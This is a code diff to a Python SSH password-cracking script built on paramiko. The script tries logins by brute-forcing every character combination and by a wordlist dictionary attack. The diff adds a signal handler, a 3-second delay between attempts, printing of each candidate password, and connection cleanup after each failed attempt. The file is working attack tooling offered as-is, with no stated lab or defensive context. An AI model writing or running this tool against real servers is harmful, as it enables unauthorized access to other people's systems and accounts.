@@ -2,6 +2,15 @@ import argparse
 import paramiko
 import itertools
 import string
+import time
+import signal
+import sys
+
+def signal_handler(sig, frame):
+    print('\n[!] Signal received. Exiting gracefully.')
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)  # Handle Ctrl+C (SIGINT)
 
 def brute_force_ssh(username, server, charset, min_length, max_length):
     client = paramiko.SSHClient()
@@ -10,12 +19,15 @@ def brute_force_ssh(username, server, charset, min_length, max_length):
     for length in range(min_length, max_length + 1):
         for password in itertools.product(charset, repeat=length):
             password = ''.join(password)
+            print(password)
             try:
-                client.connect(server, username=username, password=password, timeout=1)
+                time.sleep(3)
+                client.connect(server, username=username, password=password, timeout=6000)
                 print(f"Password found: {password}")
                 client.close()
                 return password
             except paramiko.AuthenticationException:
+                client.close()
                 continue
             except Exception as e:
                 print(f"Error: {e}")
@@ -30,13 +42,18 @@ def dictionary_attack(username, server, wordlist):
 
     with open(wordlist, 'r', encoding='utf-8', errors='ignore') as file:
         for line in file:
+        # for password in ['hallo', '12345', 'kali']:
             password = line.strip()
+            # password = password.strip()
+            print(password)
             try:
-                client.connect(server, username=username, password=password, timeout=1)
+                time.sleep(3)
+                client.connect(server, username=username, password=password)
                 print(f"Password found: {password}")
                 client.close()
                 return password
             except paramiko.AuthenticationException:
+                client.close()
                 continue
             except Exception as e:
                 print(f"Error: {e}")
